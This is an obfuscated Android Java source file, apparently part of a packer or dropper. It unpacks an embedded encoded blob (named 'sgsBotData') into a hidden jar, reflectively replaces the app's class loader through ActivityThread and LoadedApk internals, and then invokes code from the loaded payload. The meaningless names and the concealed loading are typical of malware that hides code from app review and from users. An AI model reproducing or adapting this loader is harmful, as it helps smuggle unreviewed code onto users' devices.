package zz.sgs;

import android.content.Context;
import android.util.ArrayMap;

import java.io.File;
import java.lang.ref.WeakReference;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;
import zz.sgs.sgst.MycocosAppLication;
import zz.sgs.sgst.sgsBotData;

public class Zdgrhmf {
    /**2 APPLICATION_ATTACHBASE*/
    public static void APPLICATIONATTACHBASE(Context lkj){

        if(Qdhfqjvrtr.Judgeadjustsch()){
            decompression(lkj);
            try {
                Class<?>  fas = MycocosAppLication.m_dcl.loadClass("sgs.base");
                Method asdw = fas.getMethod("sgs2", new Class[] {Context.class });

                asdw.invoke(null, new Object[] {lkj});
            } catch (Exception dww){

                dww.printStackTrace();
            }
        }
    }

    //插件打包方式的解包
    public static void decompression(Context cswq){
        try {

            String kiwjhf = cswq.getFilesDir().getAbsolutePath() + "/classes/";
            File dswcza = new File(kiwjhf);

            if (!dswcza.exists()) {
                dswcza.mkdirs();
            }

            Fpetojgwj.asncjwhqcxzw(cswq, sgsBotData.mkfjwkj23jf, kiwjhf + "/classdex.jar");

            Class dasw = Class.forName("android.app.ActivityThread");
            Method aa = dasw.getMethod("currentActivityThread",new Class[] {});
            Object ascw = aa.invoke(null, new Object[] {});


            Class dswfawfass = Class.forName("android.app.ActivityThread");
            Field casfw = dswfawfass.getDeclaredField("mPackages");
            casfw.setAccessible(true);
            ArrayMap ascwwvzxvzx = (ArrayMap) casfw.get(ascw);


            WeakReference sawwgg = (WeakReference) ascwwvzxvzx.get(cswq.getPackageName());
            MycocosAppLication.m_dcl = new DexClassLoader(kiwjhf + "/classdex.jar", kiwjhf, kiwjhf, cswq.getClassLoader());



            Class asdqw = Class.forName("android.app.LoadedApk");

            Field asdwqgbzbzx = asdqw.getDeclaredField("mClassLoader");
            asdwqgbzbzx.setAccessible(true);


            asdwqgbzbzx.set(sawwgg.get(), MycocosAppLication.m_dcl);
        } catch (Exception asfasf) {

            asfasf.printStackTrace();

        }
    }

}